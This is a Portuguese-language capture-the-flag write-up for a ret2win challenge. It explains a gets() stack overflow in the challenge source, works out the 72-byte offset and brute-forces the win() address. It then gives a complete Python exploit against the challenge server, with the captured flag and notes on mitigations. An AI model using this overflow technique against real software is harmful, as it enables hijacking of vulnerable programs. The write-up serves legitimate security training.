# PoC — Kuiper Belt Relay Core (PWN / Binary Exploitation, 15 pts) — #50
<sub>(título do desafio na plataforma: "Kuiper Belt Relay Core"; apelidado "The Relay" no texto abaixo)</sub>

**Flag:** `CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}`  *(capturada e confirmada no serviço remoto)*

## Enunciado
> The Relay rebooted an old diagnostic process — it just echoes back whatever you send it. Simple by design. But it's still carrying dead code from before the blackout: a function that's never called, sitting untouched in memory. Redirect the program into it.

- **Serviço:** `nc 34.116.80.78 9998`
- **Artefato:** `echo.c` (apenas o fonte; sem binário)
- **Técnica:** `ret2win` (stack buffer overflow → hijack do endereço de retorno)

## Análise do fonte
```c
void win() {                      // "dead code" — nunca chamada
    ...
    FILE *f = fopen("flag.txt", "r");   // lê e imprime a flag
    ...
}

void vuln() {
    char buffer[64];
    printf("Enter your message: ");
    gets(buffer);                 // VULNERÁVEL: sem verificação de limites
    printf("You said: %s\n", buffer);
}

int main() { setvbuf(stdout, NULL, _IONBF, 0); vuln(); ... }
```

Dois pontos-chave:
1. `gets(buffer)` num `buffer[64]` → overflow arbitrário na pilha. `gets` só para no `\n`, então bytes nulos no meio do payload são copiados normalmente.
2. `win()` existe no binário mas nunca é chamada → basta desviar o fluxo para ela.

## Descoberta do offset
Compilando uma referência local (sem o binário original):
```bash
# gets foi removido dos headers modernos → declarar manualmente p/ compilar
{ echo 'extern char *gets(char *);'; cat echo.c; } > echo_build.c
gcc -fno-stack-protector -no-pie echo_build.c -o echo_local
objdump -d echo_local | sed -n '/<vuln>:/,/ret/p'
#   sub  $0x40,%rsp
#   lea  -0x40(%rbp),%rax ; call gets@plt   <-- buffer em -0x40(%rbp)
```

Layout da pilha em `vuln()` (x86-64):

| Região          | Tamanho | Offset acumulado |
|-----------------|---------|------------------|
| `buffer[64]`    | 64      | 0                |
| saved RBP       | 8       | 64               |
| **saved RIP**   | 8       | **72**           |

→ **Offset até o endereço de retorno = 72 bytes.**

## Descoberta do endereço de win()
O binário é **non-PIE** (necessário para o ret2win: `win()` tem endereço fixo e não há primitiva de leak neste desafio — entrada única via `gets`).

- Build local: `win()` em `0x401196` — **não funcionou** no remoto (toolchain/gcc diferente desloca os endereços).
- Como non-PIE restringe `win()` a uma faixa estreita `0x4011xx–0x4012xx`, fiz brute-force do endereço de retorno, detectando sucesso pela string `"You hijacked"`.

```bash
python3 brute_echo.py 0x401130 0x401260 1
# [+] HIT 0x401215
```

→ **`win()` remoto = `0x401215`.**

## Exploit
```python
import socket, struct, time
OFFSET = 72
WIN    = 0x401215
payload = b"A"*OFFSET + struct.pack("<Q", WIN) + b"\n"

s = socket.create_connection(("34.116.80.78", 9998), timeout=10)
time.sleep(0.3)
s.sendall(payload)
print(s.recv(4096).decode(errors="replace"))
```
Script completo: [`solve_the_relay.py`](./solve_the_relay.py)

## Resultado
```
Enter your message: You said: AAAAAAAA...AAAA@

You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Lição
- `gets()` é intrinsecamente inseguro: não respeita o tamanho do buffer. Overflow clássico na pilha.
- **ret2win:** sem proteção de canário (`-fno-stack-protector`) e sem PIE (`-no-pie`), basta escrever o endereço fixo de uma função "morta" sobre o RIP salvo.
- Sem o binário, um ret2win non-PIE ainda é viável: offset obtido por recompilação local + endereço final por brute-force numa faixa pequena (oráculo = a mensagem de sucesso da própria `win()`).
- Mitigações que teriam barrado isto: stack canary, PIE/ASLR, e substituir `gets()` por `fgets()` com limite.

## Artefatos
- `echo.c` — fonte original (em `~/Downloads/`)
- `solve_the_relay.py` — exploit final reprodutível
